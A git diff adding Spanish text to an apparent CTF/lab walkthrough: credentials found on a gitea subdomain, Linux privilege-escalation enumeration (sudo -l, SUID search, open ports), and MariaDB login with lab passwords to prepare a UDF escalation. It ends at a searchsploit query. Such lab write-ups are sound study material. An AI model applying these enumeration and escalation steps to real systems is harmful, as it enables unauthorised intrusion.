@@ -335,7 +335,12 @@ BypassMePlz!!
 SuperHiddenKey@
 CyberGuardian99!
 ```
-
+Antes de meternos en la fase de intrusión buscamos cosas en los subdominios, haciendo fuzzing y mirando el código fuente y entre las
+cosas interesantes en el subdominio " gitea.dl" encontramos un login con unas credenciales que nos guardamos:
+```bash
+User: admin
+Pass: PassAdmin123-
+```
 ## FASE DE INTRUSIÓN
 
 Es el momento de ralizar fuerza bruta con hydra:
@@ -385,4 +390,122 @@ Ya estamos dentro
 
 ## FASE ESCALADA DE PRIVILEGIOS
 
-Recordamos que teniamos unos user y password para mysql
+Una ver dentro siendo el usuario designer, vamos a comprobar si estamos en algún grupo privilegiado:
+** privilegio en grupos:
+```bash
+id
+```
+```
+uid=1001(designer) gid=1001(designer) groups=1001(designer)
+```
+no estamos en ningún grupo con privilegios
+
+** Privilegio sudo:
+```bash
+sudo -l
+```
+```
+sudo] password for designer: 
+Sorry, user designer may not run sudo on 981e9f52b4d9.
+```
+nos pide contraseña e introducimos el pass:SuperSecurePassword123
+no tenemos ningún privilegio sudo
+
+** Buscamos SUID:
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+```
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+```
+no hay ningún binario que podamos abusar
+En este momento nos acordamos de que teníamos user y pass para mysql, vamos a comprobar si internamente el puerto
+3306 está abierto, que es por el que corre mysql:
+
+```bash
+ss -tuln
+```
+```
+Netid                   State                    Recv-Q                   Send-Q                                      Local Address:Port                                       Peer Address:Port                   Process                   
+tcp                     LISTEN                   0                        80                                              127.0.0.1:3306                                            0.0.0.0:*                                                
+tcp                     LISTEN                   0                        511                                               0.0.0.0:80                                              0.0.0.0:*                                                
+tcp                     LISTEN                   0                        128                                               0.0.0.0:22                                              0.0.0.0:*                                                
+tcp                     LISTEN                   0                        4096                                                    *:3000                                                  *:*                                                
+tcp                     LISTEN                   0                        128                                                  [::]:22                                                 [::]:*
+```
+
+parece que está corriendo, vamos a intentar conectarnos a la base de datos, tnemos estos user u pass:
+```
+ <MYSQL_ROOT_PASSWORD>root123</MYSQL_ROOT_PASSWORD>
+        <MYSQL_DATABASE>gitea</MYSQL_DATABASE>
+        <MYSQL_USER>designer</MYSQL_USER>
+        <MYSQL_PASSWORD>designer123</MYSQL_PASSWORD>
+```
+y los obtenidos del panel de login:
+
+```bash
+User: admin
+Pass: PassAdmin123-
+```
+
+concretamente nos  funciona el del panel del login:
+```bash
+mysql -u admin -p
+```
+y cuando nos pide el login usamos:
+```
+PassAdmin123-
+```
+
+estamos dentro de la base de datos, y siendo admin vamos a comprobar los privilegios de los que disponemos:
+```bash
+SHOW GRANTS;
+```
+```
+MariaDB [(none)]> SHOW GRANTS;
++------------------------------------------------------------------------------------------------------------------------------------------------+
+| Grants for admin@localhost                                                                                                                     |
++------------------------------------------------------------------------------------------------------------------------------------------------+
+| GRANT SELECT, INSERT, UPDATE, DELETE, EXECUTE ON *.* TO `admin`@`localhost` IDENTIFIED BY PASSWORD '*6B77115C352F8F98A4DD4D3401F18E19D88FC7FC' |
++------------------------------------------------------------------------------------------------------------------------------------------------+
+1 row in set (0.000 sec)
+```
+Esto huele a una escalada con User-Defined Functions, vamos a comprobar si hay definido algún valor para la variable secure_file_priv que es una variable que 
+limita el origen y destino de los datos, si está configurada en una ruta sin acceso aquí termina la cosa:
+```bash
+SHOW VARIABLES LIKE 'SECURE_FILE_PRIV';
+```
+```
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+```
+está vacía así pues podremos hacer una escalada por aquí, y por ultimo vamos a ver la ruta de los plugins:
+```bash
+SHOW VARIABLES LIKE 'PLUGIN_DIR';
+```
+```
+---------------+------------------------+
+| Variable_name | Value                  |
++---------------+------------------------+
+| plugin_dir    | /usr/lib/mysql/plugin/ |
++---------------+-------------------------
+```
+con esto en nuestra máquina buscamos un exploit:
+```bash
+searchsploit udf
+```
+
